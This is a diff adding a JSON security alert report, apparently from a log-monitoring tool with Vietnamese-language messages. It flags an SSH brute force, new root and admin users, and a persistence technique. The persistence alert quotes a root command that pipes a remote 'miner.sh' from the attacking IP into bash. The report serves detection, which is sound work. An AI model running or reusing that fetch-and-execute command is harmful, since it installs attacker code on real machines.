@@ -1,0 +1,125 @@
+{
+  "generated_at": "2025-12-04T14:31:35.430763+00:00",
+  "summary": {
+    "total_alerts": 4,
+    "severity_breakdown": {
+      "CRITICAL": 2,
+      "WARNING": 2
+    },
+    "type_breakdown": {
+      "ssh_bruteforce_detected": 1,
+      "persistence_technique_detected": 1,
+      "new_user": 2
+    },
+    "top_subjects": [
+      "admin",
+      "root",
+      "(unknown)",
+      "45.33.22.11"
+    ]
+  },
+  "alerts": [
+    {
+      "type": "ssh_bruteforce_detected",
+      "subject": "45.33.22.11",
+      "severity": "CRITICAL",
+      "score": 8.571428571428571,
+      "text": "SSH brute force detected from IP 45.33.22.11: 18/21 failed attempts (85.7% failure rate).",
+      "evidence": {
+        "source_ip": "45.33.22.11",
+        "total_attempts": 21,
+        "failed_attempts": 18,
+        "failure_rate": 0.8571428571428571
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "ssh_bruteforce",
+          "source_ip": "45.33.22.11",
+          "attempts": 21,
+          "failures": 18
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "High SSH login failure rate from 45.33.22.11"
+        }
+      }
+    },
+    {
+      "type": "persistence_technique_detected",
+      "subject": "(unknown)",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 PHÁT HIỆN: Remote code execution via curl - downloading and executing remote script từ user '(unknown)': (root) cmd (curl -s http://45.33.22.11/miner.sh | bash)",
+      "evidence": {
+        "pattern": "curl_exec_pattern",
+        "command": "(root) cmd (curl -s http://45.33.22.11/miner.sh | bash)",
+        "technique_description": "Remote code execution via curl - downloading and executing remote script"
+      },
+      "prompt_ctx": {
+        "user": "(unknown)",
+        "group": null,
+        "behavior": {
+          "type": "persistence_technique",
+          "technique": "curl_exec_pattern",
+          "command": "(root) cmd (curl -s http://45.33.22.11/miner.sh | bash)"
+        },
+        "time": "05:13 PM, Thứ Hai, 27/10/2025",
+        "baseline": {},
+        "extras": {
+          "reason": "Remote code execution via curl - downloading and executing remote script"
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "root",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới root xuất hiện với 3 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 3
+      },
+      "prompt_ctx": {
+        "user": "root",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 3
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "admin",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới admin xuất hiện với 3 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 3
+      },
+      "prompt_ctx": {
+        "user": "admin",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 3
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    }
+  ]
+}
